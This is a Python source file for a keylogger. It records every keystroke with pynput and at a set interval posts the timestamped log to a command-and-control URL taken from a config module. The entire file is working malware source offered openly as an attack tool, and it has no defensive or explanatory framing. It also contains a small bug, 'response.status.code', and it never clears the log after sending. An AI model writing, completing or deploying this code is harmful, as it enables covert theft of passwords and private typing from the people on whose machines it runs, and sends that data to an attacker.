from pynput import keyboard
import requests
import time

from keylogger.config import C2_URL, SEND_INTERVAL
from keylogger.utils import timestamp

LOG = ""

def on_press(key):
	global LOG
	try:
		LOG += f"{key.char}"
	except AttributeError:
		LOG += f"[{key.name}]"

def send_log():
	global LOG
	if LOG:
		try:
			payload = f"{timestamp()} {LOG}"
			response = requests.post(C2_URL, data={"log": payload})
			if response.status.code == 200:
				print(f"[+] Log sent successfully at {timestamp()}")
			else:
				print(f"[!] Server error: {response.status_code}")
		except Exception as e:
			print(f"[!] Failed to send log: {e}")

def main():
	listener = keyboard.Listener(on_press=on_press)
	listener.start()
	print("[*] Keylogger started. Logging every", SEND_INTERVAL, "seconds.")

	try:
		while True:
			time.sleep(SEND_INTERVAL)
			send_log()
	except KeyboardInterrupt:
		print("[*] Keylogger terminated by user.")
		listener.stop()

if __name__ == "__main__":
	main()
